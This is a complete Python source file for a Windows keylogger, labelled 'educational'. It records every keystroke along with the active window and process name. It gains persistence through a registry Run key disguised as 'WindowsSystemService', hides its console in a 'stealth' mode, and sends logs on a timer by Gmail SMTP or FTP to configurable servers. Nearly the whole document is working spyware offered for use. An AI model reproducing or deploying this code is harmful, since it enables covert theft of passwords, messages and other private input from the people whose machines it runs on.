import os
import json
import smtplib
import ftplib
import time
import sys
from datetime import datetime
from pathlib import Path
from threading import Timer
from cryptography.fernet import Fernet  # For encryption; install with `pip install cryptography`
import win32gui
import win32process
import psutil
from pynput import keyboard

# ==============================================
# CONFIGURATION - EDIT THESE SETTINGS FOR YOUR LAB
# ==============================================

# --- Logging Configuration ---
LOG_FILE = "system_log.txt"  # Innocuous filename
LOG_DIR = os.path.expanduser("~")  # Logs to user's home directory
LOG_PATH = os.path.join(LOG_DIR, LOG_FILE)
MAX_LOG_SIZE = 50000  # Max log size in bytes before rotation (e.g., 50 KB)

# --- Email Exfiltration Configuration ---
USE_EMAIL = False  # Set to True to enable email exfiltration
EMAIL_INTERVAL = 60  # Time between emails (in seconds), e.g., 300 = 5 minutes

# Gmail (Less Secure Apps must be ON - not recommended for real accounts)
# Alternatively, use an App Password if 2FA is enabled.
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
EMAIL_USER = "your_educational_email@gmail.com"
EMAIL_PASSWORD = "your_app_password"  # NEVER use your real password!
EMAIL_RECIPIENT = "your_recipient_email@gmail.com"

# --- FTP Exfiltration Configuration ---
USE_FTP = False  # Set to True to enable FTP exfiltration
FTP_INTERVAL = 120  # Time between FTP uploads (in seconds), e.g., 120 = 2 minutes

FTP_HOST = "your.ftp.server.com"
FTP_USER = "ftp_username"
FTP_PASS = "ftp_password"
FTP_UPLOAD_PATH = "/remote/path/on/server/"

# --- Encryption Configuration ---
USE_ENCRYPTION = False
# Generate a key: 
# from cryptography.fernet import Fernet; print(Fernet.generate_key().decode())
ENCRYPTION_KEY = b'your_generated_encryption_key_here' # e.g., b'abc123...'

# ==============================================
# END OF CONFIGURATION
# ==============================================

class EducationalKeylogger:
    def __init__(self):
        self.log = ""
        self.listener = None
        self.cipher = Fernet(ENCRYPTION_KEY) if USE_ENCRYPTION else None
        self.setup_persistence()
        self.single_instance_check()

    def get_active_window(self):
        """Gets the title of the currently active window."""
        try:
            hwnd = win32gui.GetForegroundWindow()
            window_title = win32gui.GetWindowText(hwnd)
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            process = psutil.Process(pid)
            process_name = process.name()
            return f"{process_name} - {window_title}"
        except Exception as e:
            return f"Unknown - Error: {str(e)}"

    def on_press(self, key):
        """Callback function for each key press event."""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        current_window = self.get_active_window()

        try:
            # Try to get the character of the key
            log_entry = f"[{timestamp}] - [{current_window}] - {key.char}\n"
        except AttributeError:
            # Handle special keys
            special_key = str(key).split('.')[-1]
            log_entry = f"[{timestamp}] - [{current_window}] - <{special_key}>\n"

        # Append to in-memory log
        self.log += log_entry
        # Also write to file immediately
        self.write_to_file(log_entry)

    def write_to_file(self, data):
        """Writes a string of data to the log file."""
        try:
            data_to_write = data
            if self.cipher:
                data_to_write = self.cipher.encrypt(data.encode()).decode() + '\n'
            
            with open(LOG_PATH, "a", encoding="utf-8") as f:
                f.write(data_to_write)
        except Exception as e:
            pass  # Fail silently

    def send_logs_email(self):
        """Sends the log file via email. Runs in a timer thread."""
        if not os.path.exists(LOG_PATH):
            return

        try:
            with open(LOG_PATH, "r", encoding="utf-8") as f:
                log_data = f.read()

            if self.cipher:
                log_data = self.cipher.encrypt(log_data.encode()).decode()

            message = f"Subject: Keylogger Report - {datetime.now()}\n\n{log_data}"

            with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
                server.starttls()
                server.login(EMAIL_USER, EMAIL_PASSWORD)
                server.sendmail(EMAIL_USER, EMAIL_RECIPIENT, message)

            print("[DEBUG] Email sent successfully.") if DEBUG else None
            self.archive_log()  # Clear log after sending

        except Exception as e:
            print(f"[DEBUG] Email error: {e}") if DEBUG else None
        finally:
            if USE_EMAIL:
                Timer(EMAIL_INTERVAL, self.send_logs_email).start()

    def send_logs_ftp(self):
        """Uploads the log file via FTP. Runs in a timer thread."""
        if not os.path.exists(LOG_PATH):
            return

        try:
            with ftplib.FTP(FTP_HOST, FTP_USER, FTP_PASS) as ftp:
                ftp.cwd(FTP_UPLOAD_PATH)
                with open(LOG_PATH, "rb") as f:
                    remote_filename = f"log_{int(time.time())}.txt"
                    ftp.storbinary(f"STOR {remote_filename}", f)

            print("[DEBUG] FTP upload successful.") if DEBUG else None
            self.archive_log()  # Clear log after sending

        except Exception as e:
            print(f"[DEBUG] FTP error: {e}") if DEBUG else None
        finally:
            if USE_FTP:
                Timer(FTP_INTERVAL, self.send_logs_ftp).start()

    def archive_log(self):
        """Renames the current log file and starts a new one."""
        try:
            if os.path.exists(LOG_PATH):
                archive_name = os.path.join(LOG_DIR, f"log_archive_{int(time.time())}.txt")
                os.rename(LOG_PATH, archive_name)
        except Exception as e:
            pass  # Fail silently

    def setup_persistence(self):
        """Adds the keylogger to the Windows Registry to run on startup."""
        try:
            # Get the path to the current executable (the Python script)
            script_path = os.path.abspath(sys.argv[0])
            
            # Registry key for current user startup programs
            reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            
            # Use the Windows Registry API (winreg) to create the key
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, "WindowsSystemService", 0, winreg.REG_SZ, f'"{sys.executable}" "{script_path}"')
            winreg.CloseKey(key)
        except Exception as e:
            print(f"[DEBUG] Persistence error: {e}") if DEBUG else None

    def single_instance_check(self):
        """Checks if another instance is already running to prevent duplicates."""
        global _log_file_handle
        try:
            # Try to create a lock file exclusively
            _log_file_handle = open(os.path.join(LOG_DIR, '.keylogger.lock'), 'w')
            _log_file_handle.write('1')
            # If successful, this is the only instance
        except IOError:
            # If the lock file exists, another instance is running
            print("Another instance is already running. Exiting.")
            sys.exit(0)

    def start(self):
        """Main method to start the keylogger and all its functions."""
        print(f"[DEBUG] Keylogger started. Logging to: {LOG_PATH}") if DEBUG else None

        # Start the exfiltration timers if enabled
        if USE_EMAIL:
            Timer(EMAIL_INTERVAL, self.send_logs_email).start()
        if USE_FTP:
            Timer(FTP_INTERVAL, self.send_logs_ftp).start()

        # Start the keyboard listener
        with keyboard.Listener(on_press=self.on_press) as self.listener:
            self.listener.join()

# Global variable for the lock file handle
_log_file_handle = None

# Set DEBUG to True for development, False for "stealth"
DEBUG = True

if __name__ == "__main__":
    # If the script is run with the 'stealth' argument, disable debug prints
    if 'stealth' in sys.argv:
        DEBUG = False

    # Hide the console window if not in debug mode (Windows only)
    if not DEBUG:
        import win32console
        import win32gui
        win32console.GetConsoleWindow()
        win32gui.ShowWindow(win32console.GetConsoleWindow(), 0) # 0 = SW_HIDE

    keylogger = EducationalKeylogger()
    keylogger.start()